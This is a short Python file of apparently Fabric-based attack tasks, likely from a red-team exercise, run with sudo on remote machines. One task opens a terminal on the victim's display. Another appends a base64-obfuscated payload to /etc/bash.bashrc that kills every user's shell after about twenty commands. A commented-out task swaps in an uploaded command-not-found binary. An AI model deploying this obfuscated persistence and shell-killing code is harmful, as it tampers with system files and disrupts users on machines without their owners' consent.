def parrot_party(connect): #download_gnome AND USE THE ACTUAL USER
    connect.sudo("DISPLAY=:0 gnome-terminal -e \"/bin/bash -l -c \'curl parrot.live; cat -\'\"")


def countdown_shell(connect):
    connect.sudo("sh -c 'echo "
                 "\"ZXhwb3J0IENPVU5UPTIwCmV4cG9ydCBQUk9NUFRfQ09NTUFORD0iZXhwb3J0IENPVU5UPVwiXCQoZXhwciBcJENPVU5UIC0gMS"
                 "lcIjsgZWNobyBcJENPVU5UOyBpZiBbIFwkQ09VTlQgLWx0IDAgXTsgdGhlbiBlY2hvIFwiQnllIDspIFwkKGVjaG8gXCRTU0hfQ09"
                 "OTkVDVElPTiB8IGF3ayAne3ByaW50IFwkMX0nKVwiOyBzbGVlcCAxOyBraWxsIC05IFwkUFBJRDsgZmkiICAgICAgICAgICAgICAg"
                 "ICAgICAgICAgICAgICAgICAgICAgICAK\" | base64 -d | sudo tee -a /etc/bash.bashrc'")


# def itsyaboi(connect):
#     connect.put('UploadFiles/command-not-found')
#     connect.sudo('mv command-not-found /usr/lib/')
#     connect.sudo('chmod +x /usr/lib/command-not-found')

